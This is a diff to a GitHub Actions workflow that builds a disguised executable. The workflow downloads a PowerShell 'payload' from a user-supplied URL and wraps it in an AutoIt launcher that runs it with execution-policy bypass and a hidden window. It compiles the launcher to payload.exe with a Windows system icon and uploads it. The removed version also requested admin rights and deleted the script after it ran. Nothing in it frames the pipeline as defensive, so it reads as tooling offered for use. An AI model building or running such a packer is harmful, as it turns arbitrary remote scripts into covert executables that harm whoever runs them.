@@ -1,10 +1,10 @@
-name: Convert Script to EXE (AutoIt)
+name: Build PowerShell to EXE (AutoIt)
 
 on:
   workflow_dispatch:
     inputs:
       payload_url:
-        description: 'URL to fetch PowerShell script'
+        description: 'URL to fetch PowerShell script (.ps1)'
         required: true
         type: string
 
@@ -17,44 +17,43 @@ jobs:
     - name: Checkout code
       uses: actions/checkout@v3
 
-    # Step 2: Install AutoIt
+    # Step 2: Download & Install AutoIt
     - name: Install AutoIt
       shell: powershell
       run: |
-        Invoke-WebRequest -Uri "https://www.autoitscript.com/autoit3/scite/download/AutoItFullInstallation.exe" -OutFile "AutoItInstaller.exe"
-        Start-Process -FilePath "AutoItInstaller.exe" -ArgumentList "/S" -Wait
+        Invoke-WebRequest -Uri "https://www.autoitscript.com/cgi-bin/getfile.pl?autoit3/autoit-v3-setup.zip" -OutFile "autoit.zip"
+        Expand-Archive -Path "autoit.zip" -DestinationPath "AutoIt"
+        Start-Process -FilePath "AutoIt\autoit-v3-setup.exe" -ArgumentList "/S" -Wait
+        if (!(Test-Path "C:\Program Files (x86)\AutoIt3\Aut2Exe\Aut2Exe.exe")) { Write-Host "AutoIt installation failed!"; exit 1 }
 
-    # Step 3: Fetch PowerShell Payload
-    - name: Fetch PowerShell Payload
+    # Step 3: Fetch PowerShell Script
+    - name: Fetch PowerShell Script
       shell: powershell
       run: |
         Invoke-WebRequest -Uri '${{ github.event.inputs.payload_url }}' -OutFile 'payload.ps1'
         if (!(Test-Path "payload.ps1")) { Write-Host "Payload script missing!"; exit 1 }
 
-    # Step 4: Create AutoIt Wrapper
-    - name: Create AutoIt Script
+    # Step 4: Generate AutoIt Script
+    - name: Create AutoIt Wrapper
       shell: powershell
       run: |
-        Set-Content -Path "payload.au3" -Value @"
-        #RequireAdmin
-        $script = @TempDir & "\payload.ps1"
-        FileWrite($script, '$(Get-Content -Raw payload.ps1)')
-        RunWait('powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "' & $script & '"', @TempDir, @SW_HIDE)
-        FileDelete($script)
+        Set-Content -Path "wrapper.au3" -Value @"
+        Run('powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File payload.ps1', '', @SW_HIDE)
         "@
 
     # Step 5: Compile AutoIt Script to EXE
     - name: Compile AutoIt to EXE
       shell: cmd
       run: |
-        "C:\Program Files (x86)\AutoIt3\Aut2Exe\Aut2Exe.exe" /in payload.au3 /out payload.exe /icon "C:\Windows\System32\shell32.dll"
+        "C:\Program Files (x86)\AutoIt3\Aut2Exe\Aut2Exe.exe" /in wrapper.au3 /out payload.exe /icon "C:\Windows\System32\shell32.dll"
 
-    # Step 6: Upload the EXE
-    - name: Upload EXE
+    # Step 6: Upload Executable
+    - name: Upload Executable
       uses: actions/upload-artifact@v4
       with:
-        name: payload_exe
+        name: powershell_payload_exe
         path: payload.exe
+
 
 
 
